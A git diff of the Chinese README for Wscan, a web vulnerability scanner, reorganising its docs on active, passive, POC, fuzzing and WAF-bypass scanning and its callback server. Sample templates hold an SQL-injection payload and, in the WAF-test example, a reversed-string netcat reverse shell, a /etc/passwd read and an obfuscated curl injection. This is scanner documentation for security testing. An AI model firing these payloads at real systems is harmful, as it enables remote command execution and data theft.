@@ -45,102 +45,227 @@ Wscan是一款专注于WEB安全的扫描器，它向Nmap致敬，而Nmap已经�
 | `自定义FUZZ插件`    |     √         |  ×           |      对body、query中的参数进行模糊测试                                                        |
 | `Waf绕过/Waf测试`    |     √         |  ×           |       自定义各种特殊的Payload，测试Waf是否能拦截                                                         |
 | `WEB组件识别`    |     √         |  ×           |       识别网站应用的组件及相关技术                                                         |
-# 运行示例 
+# 最佳实践 
 
 ⬇️[下载地址](https://github.com/chushuai/wscan/releases) 
 [🏠最佳实践](https://github.com/chushuai/wscan/blob/main/doc/最佳实践.md)
 [👻WEB指纹插件编写指南](https://github.com/chushuai/wscan/blob/main/doc/WEB指纹插件编写指南.md) 
 [🎯WEB通用漏扫插件编写指南](https://github.com/chushuai/wscan/blob/main/doc/WEB通用漏扫插件编写指南.md)
+
+## 代理扫描
+配置漏扫插件、动态爬虫、静态爬虫代理
 ```
-(1) 主动扫描
+http:
+    proxy: "socks5://153.34.245.41:7777"
+```
+
+## 主动扫描
+主动扫描，支持静态爬虫、动态爬虫、URL文件、单个URL等
+### Ⅰ.深度扫描
+Wscan首次运行时，将会生成一个名为config.yaml的文件。将plugins下面的所有插件的enabled设置为True。
+**如果要进行POC扫描，请先参考POC扫描配置，下载插件包并配置插件包路径。**
+```
 ./wscan  --log-level=debug ws --basic-crawler http://testphp.vulnweb.com/ --json-output=wscan_scan_result.json --html-output=wscan_scan_result.html
 ./wscan  --log-level=debug ws --browser  http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
 ./wscan  --log-level=debug ws --url http://testphp.vulnweb.com/listproducts.php?cat=1  --json-output=wscan_scan_result.json
 ./wscan  --log-level=debug ws --url-file=/wscan/url_file.txt --html-output=wscan_scan_result.html
-./wscan  --log-level=debug ws --poc=/your_wscan_poc/wscan-poc/pocs/* --url http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
-(2) 被动扫描
-./wscan  --log-level=debug ws --listen=127.0.0.1:1000 --json-output=wscan_scan_result.json  
-(3) POC扫描
-    3.1 POC下载地址 https://github.com/chushuai/wscan-poc/releases
-    3.2 Wscan首次运行时，将会生成一个名为config.yaml的文件。您需要修改该文件中的以下内容，以指定include_poc的路径。
-        prometheus:
-            enabled: true
-            depth: 1
-            auto_load_poc: false
-            include_poc:
-                - C:\wscan_windows_amd64.exe\wscan-poc-1.0.0\pocs\*.yml
-            exclude_poc: [] 
-    3.3 通过命令行启用--plug=prometheus，并且指定--url-file(一行一个url)绝对路径，即可进行大范围POC检测
-        ./wscan --log-level=debug ws --plug=prometheus  --url-file=/url_file.txt  --html-output=wscan_scan_result.html
-        
-(4) 自定义FUZZ插件，对body、query中的参数进行模糊测试
-    4.1 不同于POC测试，自定义FUZZ插件，会对指定位置的参数进行FUZZ, 并支持自定义CEL表达式来验证是否存在漏洞
-        样例参考 https://github.com/chushuai/wscan/tree/main/core/plugins/custom/tmpl/
-        插件样例
-        ---
-        name: "custom-sqli"
-        set:
-          r1: randomInt(800000000, 1000000000)
-        payload:
-          - extractvalue(1,concat(char(126),md5({{r1}})))
-        placeholder:
-          - query
-          - body
-          - header
-          - cookie
-        expression:  response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
-        ---
-        
-    4.2 您需要修改config.yaml文件中的以下内容，以指定custom的路径。
-          custom:
-            enabled: true
-            depth: 0
-            auto_load_tmpl: false
-            include_tmpl:
-                - /wscan/core/plugins/custom/tmpl/*.yml
-            exclude_tmpl: []
-    4.3 通过命令行启用--plug=waftest，即可对目标网站进行自定义Payload测试。
-        ./wscan --log-level=debug ws --plug=custom --url http://testphp.vulnweb.com/listproducts.php?artist=1  --html-output=wscan_scan_result.html
-(5) Waf绕过/Waf测试
-    5.1 不同于POC测试，自定义WEB通用漏洞扫描插件，会对指定位置的参数进行FUZZ,
-        样例参考 https://github.com/chushuai/wscan/tree/main/core/plugins/waftest/tmpl/owasp
-        插件样例
-        ---
-        payload:
-          - $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
-          - /etc/passwd
-          - "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
-        encoder:
-          - URL
-        placeholder:
-          - URLParam
-          - HTMLForm
-          - HTMLMultipartForm
-          - JSONRequest
-        type: "RCE"
-        ...
-        
-    5.2 您需要修改config.yaml文件中的以下内容，以指定include_tmpl的路径。
-        waftest:
-            enabled: true
-            depth: 0
-            auto_load_tmpl: false 
-            include_tmpl:
-              - /wscan/core/plugins/custom_tmpl/tmpl/owasp/*.yml
-            exclude_tmpl: [ ]
-            block_status_codes: # 被WAF阻止时HTTP状态码列表,默认值为403
-              - 403
-            pass_status_codes: # 未被WAF阻止时HTTP状态码列表, 默认值为200或404
-              - 200
-              - 404
-            block_regex: "" # 被WAF阻止网页的正则表达式
-            pass_regex: "" # 未被WAF阻止网页的正则表达式
-            non_blocked_as_passed: false
-    5.3 通过命令行启用--plug=waftest，即可对目标网站进行自定义Payload测试。
-        ./wscan --log-level=debug ws --plug=custom_tmpl  --browser  http://testphp.vulnweb.com/  --html-output=wscan_scan_result.html
-(6) 独立部署反连模块
-./wscan  reverse
 ```
+### Ⅱ.专项扫描
+在命令行中使用plug参数启用要扫描的插件
+```
+./wscan  --log-level=debug ws  --plug=sqldet --basic-crawler http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
+```
+## 被动扫描
+### Ⅰ.生成并安装CA
+运行genca命令之后，将在当前文件夹生成 ca.crt 和 ca.key 两个文件。
+```
+./wscan genca
+```
+安装CA的方法与XRAY一致，可以参考XRAY文档
+
+### Ⅱ.专项扫描被动
+在命令行中使用plug参数启用要扫描的插件
+```
+./wscan  --log-level=debug ws  --plug=sqldet,xss  --listen=127.0.0.1:1000 --json-output=wscan_scan_result.json  
+```
+
+### Ⅲ.深度扫描被动
+Wscan首次运行时，将会生成一个名为config.yaml的文件。将plugins下面的所有插件的enabled设置为True。
+**如果要进行POC扫描，请先参考POC扫描配置，下载插件包并配置插件包路径。**
+```
+./wscan  --log-level=debug ws --listen=127.0.0.1:1000 --json-output=wscan_scan_result.json  
+```
+
+## POC扫描
+### 下载插件包
+Wscan不内置任何POC插件，但Wscan的prometheus插件引擎已支持Nuclei、XRAY、Goby 标准POC插件，
+与其它扫描器不同的是Wscan可以自定义POC检测的深度，从而发现更多的Web安全问题。
+
+我们把下载的 X-ray 和 Nuclei 插件包放入同一个目录，并在配置文件中指定插件包的路径。
+
+![](doc/img/wscan_poc.jpg)
+#### Step1
+XRAY、Goby POC插件包下载地址
+
+```
+https://github.com/chaitin/xray/tree/master/pocs
+```
+#### Step2
+Nuclei POC插件包下载地址
+```
+https://github.com/projectdiscovery/nuclei-templates/tree/main/http
+```
+Nuclei包含许多类型插件，只建议保存nuclei-templates-main/http中的插件，将其拷贝到wscan-poc目录中即可
+
+### 专项扫描
+Ⅰ. 同时扫描Nuclei、XRAY、Goby POC插件, 这种模式下只启用POC检测插件，不启用其它类型的插件
+```
+./wscan --log-level=debug ws  --poc=/your_wscan_poc/wscan-poc/pocs/* --url http://testphp.vulnweb.com/ --html-output=wscan_scan_result.html
+./wscan --log-level=debug ws  --poc=/your_wscan_poc/wscan-poc/pocs/*  --url-file=/url_file.txt  --html-output=wscan_scan_result.html
+```
+### 深度扫描
+Ⅰ.运行方式与主被动扫描一致，但需要配置插件包路径, Wscan首次运行时，将会生成一个名为config.yaml的文件。您需要修改该文件中的以下内容，以指定include_poc的路径。
+
+```yaml
+prometheus:
+    enabled: true
+    depth: 1                 # 是探测深度, 默认为 1, 即只在 URL 深度为 0, 和深度为 1 时运行该插件
+    auto_load_poc: false
+    include_poc: 
+       - /your_wscan_poc/wscan-poc/pocs/*
+    exclude_poc: []
+
+```
+## 自定义FUZZ插件
+
+不同于POC测试，自定义FUZZ插件，会对指定位置的参数进行FUZZ, 并支持自定义CEL表达式来验证是否存在漏洞
+### Step1 编写自定义FUZZ插件
+样例参考 https://github.com/chushuai/wscan/tree/main/core/plugins/custom/tmpl/
+```yaml
+name: "custom-sqli"
+set:
+  r1: randomInt(800000000, 1000000000)
+payload:
+  - extractvalue(1,concat(char(126),md5({{r1}})))
+placeholder:
+  - query
+  - body
+  - header
+  - cookie
+expression:  response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+```
+
+### Step2 修改配置文件
+您需要修改config.yaml文件中的以下内容，以指定custom的路径。
+```yaml
+custom:
+    enabled: true
+    depth: 0
+    auto_load_tmpl: false
+    include_tmpl:
+        - /wscan/core/plugins/custom/tmpl/*.yml
+    exclude_tmpl: []
+```
+### Step3 执行自定义FUZZ插件
+通过命令行启用--plug=waftest，即可对目标网站进行自定义Payload测试。
+```
+./wscan --log-level=debug ws --plug=custom --url http://testphp.vulnweb.com/listproducts.php?artist=1  --html-output=wscan_scan_result.html
+```
+
+##  Waf绕过/Waf测试
+不同于POC测试，自定义WEB通用漏洞扫描插件，会对指定位置的参数进行FUZZ,
+
+### Step1 插件样例
+样例参考 https://github.com/chushuai/wscan/tree/main/core/plugins/waftest/tmpl/owasp
+```yaml
+payload:
+- $(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+- /etc/passwd
+- "`curl -L http://\u24BC\u24C4\u24C4\u24BC\u24C1\u24BA.\u24B8\u24C4\u24C2`"
+encoder:
+- URL
+placeholder:
+- URLParam
+- HTMLForm
+- HTMLMultipartForm
+- JSONRequest
+type: "RCE"
+```
+### Step2
+您需要修改config.yaml文件中的以下内容，以指定include_tmpl的路径。
+```yaml
+waftest:
+    enabled: true
+    depth: 0
+    auto_load_tmpl: false 
+    include_tmpl:
+      - /wscan/core/plugins/custom_tmpl/tmpl/owasp/*.yml
+    exclude_tmpl: [ ]
+    block_status_codes: # 被WAF阻止时HTTP状态码列表,默认值为403
+      - 403
+    pass_status_codes: # 未被WAF阻止时HTTP状态码列表, 默认值为200或404
+      - 200
+      - 404
+    block_regex: "" # 被WAF阻止网页的正则表达式
+    pass_regex: "" # 未被WAF阻止网页的正则表达式
+    non_blocked_as_passed: false
+```
+### Step3 执行自定义waftest插件
+
+通过命令行启用--plug=waftest，即可对目标网站进行自定义Payload测试。
+```
+  ./wscan --log-level=debug ws --plug=custom_tmpl  --browser  http://testphp.vulnweb.com/  --html-output=wscan_scan_result.html
+```
+
+## 返连模块
+在进行漏洞检测的时候，我们会发现有很多的漏洞在执行了一些命令后，从表面上看没有任何回应的，比如命令执行漏洞，log4j rce，fastjson，ssrf等等，
+但由于前端并没有对应的展示，导致我们并不能知道文件是否成功读取，那么当面对这类的漏洞，我们就需要一个反连平台，
+通过让目标执行ping、curl等命令，对反连平台发起请求，反连平台在接受到请求后， 就能告诉我们，命令触发了，也就代表了漏洞存在了。
+![](doc/img/返连平台.jpg)
+
+注意： **Wscan支持http、dns、rmi、ldap四种返连类型，其中http、rmi、ldap复用同一个端口。**
+
+### 独立部署模式
+#### Ⅰ.服务端部署
+```yaml
+reverse:
+    db_file_path: "reverse.db"
+    token: "xxxx"
+    http:
+        enabled: true
+        listen_ip: 0.0.0.0
+        listen_port: ""
+        ip_header: ""
+    dns:
+        enabled: false
+        listen_ip: 0.0.0.0
+        domain: ""
+        is_domain_name_server: false
+        resolve:
+            - type: A
+              record: localhost
+              value: 127.0.0.1
+              ttl: 60
+    client:
+        remote_server: false
+        http_base_url: ""
+        dns_server_ip: ""
+```
+#### Ⅱ.客户端配置
+```yaml
+reverse:
+    client:
+        remote_server: true
+        http_base_url: ""
+        dns_server_ip: ""
+        rmi_server_addr: ""
+```
+## 扫描报告
+Wscan支持JSON、HTML等多种格式的扫描报告，其中包含详尽的漏洞验证逻辑。
+
+![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/tool/github/118a026213bf2aca4f016218f626cf15.png)
+
+
 # 项目进展
 * 2023.11.05 发布v1.0.0 二进制版，支持简单的Web通用漏洞检测
 * 2023.11.12 发布v1.0.1 二进制版，静态爬虫
@@ -185,16 +310,8 @@ Wscan的目标是创建一个开源且非盈利的项目。然而，由于Wscan�
 ![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/tool/github/a93d6e157be316b086faba9b6eebeebf.png)
 
 
-# 返连平台
-在进行漏洞检测的时候，我们会发现有很多的漏洞在执行了一些命令后，从表面上看没有任何回应的，比如命令执行漏洞，log4j rce，fastjson，ssrf等等， 但由于前端并没有对应的展示，导致我们并不能知道文件是否成功读取，那么当面对这类的漏洞，我们就需要一个反连平台， 通过让目标执行ping、curl等命令，对反连平台发起请求，反连平台在接受到请求后， 就能告诉我们，命令触发了，也就代表了漏洞存在了。
 
-注意： Wscan支持http、dns、rmi、ldap四种返连类型，其中http、rmi、ldap复用同一个端口。
-![](doc/img/返连平台.jpg)
 
-# 扫描报告
-Wscan支持JSON、HTML等多种格式的扫描报告，其中包含详尽的漏洞验证逻辑。
-
-![](https://ctstack-oss.oss-cn-beijing.aliyuncs.com/tool/github/118a026213bf2aca4f016218f626cf15.png)
 
 # Star History
 
